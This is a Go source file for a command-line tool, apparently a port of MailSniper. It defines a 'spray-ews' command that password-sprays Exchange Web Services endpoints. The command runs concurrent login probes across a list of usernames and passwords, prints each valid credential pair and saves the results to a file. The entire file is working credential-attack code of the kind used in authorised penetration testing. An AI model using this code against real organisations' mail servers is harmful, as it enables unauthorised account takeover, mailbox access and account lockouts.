package cmd

import (
	"fmt"
	"sync"
	"time"

	"github.com/spf13/cobra"
	"mailsniper-go/internal/ews"
	"mailsniper-go/internal/output"
)

func newSprayEWSCmd() *cobra.Command {
	var (
		hostname     string
		ewsURL       string
		userList     string
		password     string
		passwordList string
		version      string
		threads      int
		outFile      string
		outFmt       string
		skipTLS      bool
		delay        int
	)

	cmd := &cobra.Command{
		Use:   "spray-ews",
		Short: "Password spray against EWS (Invoke-PasswordSprayEWS)",
		Long: `Attempts to authenticate to an EWS endpoint using a list of usernames
and a single password (or a password list). A successful probe uses a lightweight
FindItem request.

Equivalent to the PowerShell Invoke-PasswordSprayEWS function.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			users, err := readLines(userList)
			if err != nil {
				return fmt.Errorf("read user list: %w", err)
			}

			// Build password list: --password-list takes precedence over --password.
			var passwords []string
			if passwordList != "" {
				passwords, err = readLines(passwordList)
				if err != nil {
					return fmt.Errorf("read password list: %w", err)
				}
			} else if password != "" {
				passwords = []string{password}
			} else {
				return fmt.Errorf("provide --password or --password-list")
			}

			if ewsURL == "" && hostname != "" {
				ewsURL = ews.BuildEWSURL(hostname)
			}
			if ewsURL == "" {
				return fmt.Errorf("provide --hostname or --ews-url")
			}

			fmt.Printf("[*] Loaded %d users from %s\n", len(users), userList)
			fmt.Printf("[*] Spraying EWS at %s with %d password(s)\n", ewsURL, len(passwords))
			fmt.Printf("[*] Threads: %d | Delay: %dms\n", threads, delay)

			type result struct {
				user     string
				password string
				valid    bool
			}

			var allResults []output.SprayResult

			for _, pwd := range passwords {
				fmt.Printf("[*] Trying password: %s\n", pwd)

				sem := make(chan struct{}, threads)
				resultCh := make(chan result, len(users))
				var wg sync.WaitGroup

				for _, user := range users {
					user := user
					wg.Add(1)
					sem <- struct{}{}
					go func() {
						defer wg.Done()
						defer func() { <-sem }()
						if delay > 0 {
							time.Sleep(time.Duration(delay) * time.Millisecond)
						}
						client := ews.NewClient(ewsURL, user, pwd, version, skipTLS)
						_, probErr := client.FindItems(user, "inbox", 1)
						valid := probErr == nil
						resultCh <- result{user, pwd, valid}
					}()
				}
				wg.Wait()
				close(resultCh)

				for r := range resultCh {
					if r.valid {
						fmt.Printf("[+] VALID: %s:%s\n", r.user, r.password)
					}
					allResults = append(allResults, output.SprayResult{
						Username: r.user,
						Password: r.password,
						Valid:    r.valid,
					})
				}
			}

			if outFile != "" {
				fmt.Printf("[*] Writing results to %s\n", outFile)
				if err := output.WriteSprayResults(outFile, output.ParseFormat(outFmt), allResults); err != nil {
					return fmt.Errorf("write results: %w", err)
				}
			}
			return nil
		},
	}

	f := cmd.Flags()
	f.StringVar(&hostname, "hostname", "", "Exchange server hostname")
	f.StringVar(&ewsURL, "ews-url", "", "Full EWS URL (overrides --hostname)")
	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
	f.StringVar(&password, "password", "", "Single password to spray")
	f.StringVar(&passwordList, "password-list", "", "File with passwords to spray (one per line)")
	f.StringVar(&version, "exchange-version", "Exchange2010", "Exchange server version")
	f.IntVar(&threads, "threads", 5, "Number of concurrent threads")
	f.StringVar(&outFile, "output", "", "Output file path")
	f.StringVar(&outFmt, "output-format", "txt", "Output format: csv, json, txt")
	f.BoolVar(&skipTLS, "skip-tls", false, "Skip TLS certificate verification")
	f.IntVar(&delay, "delay", 0, "Delay between requests per thread (milliseconds)")

	_ = cmd.MarkFlagRequired("user-list")
	return cmd
}
